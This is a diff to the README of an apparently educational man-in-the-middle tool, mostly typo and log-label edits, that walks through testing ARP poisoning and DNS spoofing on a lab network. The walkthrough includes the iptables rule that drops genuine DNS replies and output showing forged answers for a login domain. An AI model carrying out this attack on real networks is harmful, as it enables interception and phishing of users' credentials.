@@ -17,26 +17,26 @@ The **SPOOF_MAP** global variable has the mappings of the targeted domain to the
 
 ## Testing
 
-1. On victim device, run: `nslookup www.fakelogin.net`. This will give this output (not spoofed, `192.168.88.1` is the **GATEWAY_IP**):
+1. On the victim device, run: `nslookup www.fakelogin.net`. This will give this output (not spoofed, `192.168.88.1` is the **GATEWAY_IP**):
     ```
     Server:  router.lan
     Address:  192.168.88.1
 
     *** router.lan can't find www.fakelogin.net: Non-existent domain 
     ```
-2. On attaker device, the attack is ran with: `sudo python3 mitm_spoofer.py`
+2. On the attacker device, the attack is run with: `sudo python3 mitm_spoofer.py`
     Program output:
     ```
     [*] Starting MITM Attack on Victim: 192.168.88.227
-    [*] The gateway of this network is at IP address 192.168.88.1 and MAC address 48:a9:8a:45:3a:5a.
-    [*] The victim at IP address 192.168.88.227 is at MAC address e0:0a:f6:b1:4e:0d.
+    [ARP Poison] The gateway of this network is at IP address 192.168.88.1 and MAC address 48:a9:8a:45:3a:5a.
+    [ARP Poison] The victim at IP address 192.168.88.227 is at MAC address e0:0a:f6:b1:4e:0d.
     [*] IP Forwarding enabled.
     [A] Executing IPTables command: sudo iptables -A FORWARD -p udp -s 192.168.88.1 --sport 53 -d 192.168.88.227 -j DROP
-    [*] DNS response dropping rule installed to win the race.
-    [*] ARP Poisoning started. MiTM position established.
-    [*] Starting DNS sniffer on interface ens33
+    [DNS Spoof] DNS response dropping rule installed to win the race.
+    [ARP Poison] ARP Poisoning started. MiTM position established.
+    [DNS Spoof] Starting DNS sniffer on interface ens33
     ```
-3. On victim device, run: `nslookup www.fakelogin.net`. This will give this output (spoofed, `192.168.88.226` is the **ATTACKER_IP**):
+3. On the victim device, run: `nslookup www.fakelogin.net`. This will give this output (spoofed, `192.168.88.226` is the **ATTACKER_IP**):
     ```
     DNS request timed out.
         timeout was 2 seconds.
@@ -47,7 +47,7 @@ The **SPOOF_MAP** global variable has the mappings of the targeted domain to the
     Addresses:  192.168.88.226
             192.168.88.226
     ```
-    On attaker device, we can see the program output:
+    On the attacker device, we can see the program output (`192.168.88.227` is the **VICTIM_IP**):
     ```
     [DNS Spoof] Received a packet from: 192.168.88.227
     [DNS Spoof] Packet is a DNS QUERY (qr=0). Proceeding.
@@ -55,13 +55,13 @@ The **SPOOF_MAP** global variable has the mappings of the targeted domain to the
     [DNS Spoof] Intercepted query for: www.fakelogin.net.; FORGING REPLY...
     [DNS Spoof] SENT SPOOFED REPLY: www.fakelogin.net. -> 192.168.88.226
     ```
-4. On attaker device, to terminate the attack press `CTRL+C`. Program output:
+4. On the attacker device, to terminate the attack, press `CTRL+C`. Program output:
     ```
     [!] CTRL+C detected. Shutting down...
     [ARP Poison] ARP tables restored successfully.
     [D] Executing IPTables command: sudo iptables -D FORWARD -p udp -s 192.168.88.1 --sport 53 -d 192.168.88.227 -j DROP
-    [*] DNS response dropping rule removed.
+    [DNS Spoof] DNS response dropping rule removed.
     [*] IP Forwarding disabled.
     [*] Cleanup complete. Terminating.
     ```
-5. After the attack is terminated, ff victim device runs `nslookup www.fakelogin.net` again, they will get the non-spoofed result. 
+5. After the attack is terminated, if the victim device runs `nslookup www.fakelogin.net` again, they will get the non-spoofed result. 
